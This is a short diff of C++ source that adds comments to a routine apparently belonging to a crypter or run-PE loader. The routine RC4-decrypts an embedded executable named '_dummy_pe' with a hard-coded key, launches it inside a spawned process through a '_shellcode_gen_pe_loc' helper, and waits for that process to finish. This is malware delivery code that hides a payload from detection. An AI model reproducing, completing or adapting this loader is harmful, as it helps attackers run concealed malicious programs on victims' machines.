@@ -91,10 +91,12 @@ int main()
 	//ACTUAL LENGTH IS -1 DISINCLUDE NULL PADDING
 	const char* key = "fuckyoums";
 	std::vector<unsigned char> _kptr(key, key + strlen(key));
+	//copy global array to scoped array to avoid access violations
 	unsigned char* _dat = new unsigned char[184320];
 	for (int i = 0; i < 184320; i++) {
 		_dat[i] = _dummy_pe[i];
 	}
+	//3rd paramer is the size of the array in bytes, 4th parameter is the size of the key in bytes
 	_rc4::_run_direct(lvoid(key), _dat, 184320, 9);
 	if (!_funcs::_shellcode_gen_pe_loc(&_pi, &_si, reinterpret_cast<LPVOID>(_dat), _argsz, sizeof _argsz)) {
 		_api::__WaitForSingleObject(_pi.hProcess, INFINITE);
